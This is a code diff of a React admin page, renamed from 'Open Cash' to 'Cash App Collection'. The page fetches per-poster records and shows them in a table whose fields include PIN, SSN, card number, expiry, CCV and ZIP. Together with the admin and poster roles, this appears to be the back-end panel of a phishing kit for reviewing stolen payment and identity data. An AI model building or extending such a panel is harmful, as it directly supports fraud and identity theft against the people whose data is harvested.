@@ -3,35 +3,38 @@ import { FaEnvelope } from "react-icons/fa";
 import Loader from "../components/common/Loader";
 import Table from "../components/Table";
 import { collectionColumn } from "../components/Table/columns/collectionColumn";
-import { openCashColumn } from "../components/Table/columns/openCashColumn";
+import { cashAppColumn } from "../components/Table/columns/cashAppColumn";
 import useGetData from "../hooks/useGetData";
 
-function OpenCashPage() {
+function CashAppPage() {
   // const { username, password, posterId, links, details } = data?.data;
 
   const { data } = useSession();
-  const id = data?.user?.id;
-  // console.log("poster session", id);
+  const id = data?.user?.admin ? data?.user?.adminId : data?.user?.posterId;
+  console.log("data", data);
 
-  // const { fetchedData, isLoading } = useGetData(`/poster/details/${id}`);
+  const { fetchedData, isLoading } = useGetData(
+    `/cash/app/details/admin/poster/${id}`
+  );
 
-  // const details = fetchedData?.data?.details;
+  const details = fetchedData?.cashapp;
 
-  // console.log(details);
+  // console.log("details", details2);
 
-  const details = [
-    {
-      contact: "1234",
-      code: "abcd",
-      pin: "abcd",
-      ssn: "abcd",
-      site: "abcd",
-      card_number: "abcd",
-      mm_yy: "abcd",
-      ccv: "abcd",
-      zip: "abcd",
-    },
-  ];
+  // const details = [
+  //   {
+  //     site: "website.com",
+  //     contact: "1234",
+  //     code: "abcd",
+  //     pin: "abcd",
+  //     ssn: "abcd",
+  //     site: "abcd",
+  //     card_number: "abcd",
+  //     mm_yy: "abcd",
+  //     ccv: "abcd",
+  //     zip: "abcd",
+  //   },
+  // ];
 
   return (
     <div className="relative">
@@ -40,20 +43,21 @@ function OpenCashPage() {
           <FaEnvelope />
         </span>
         <h1 className="text-2xl font-bold text-custom-gray2">
-          Open Cash Collection
+          Cash App Collection
         </h1>
       </div>
 
-      {/* <Loader isLoading={isLoading}> */}
-      <div className="mt-7">
-        <div className="p-4 bg-white rounded shadow-md lg:p-8">
-          <Table columnsHeading={openCashColumn} usersData={details} />
-          {/* {details && (
-              <Table columnsHeading={collectionColumn} usersData={details} />
-            )} */}
+      <Loader isLoading={isLoading}>
+        <div className="mt-7">
+          <div className="p-4 bg-white rounded shadow-md lg:p-8">
+            {details ? (
+              <Table columnsHeading={cashAppColumn} usersData={details} />
+            ) : (
+              <p className="">No data found</p>
+            )}
+          </div>
         </div>
-      </div>
-      {/* </Loader> */}
+      </Loader>
     </div>
   );
 }
@@ -79,4 +83,4 @@ function OpenCashPage() {
 //   }
 // }
 
-export default OpenCashPage;
+export default CashAppPage;
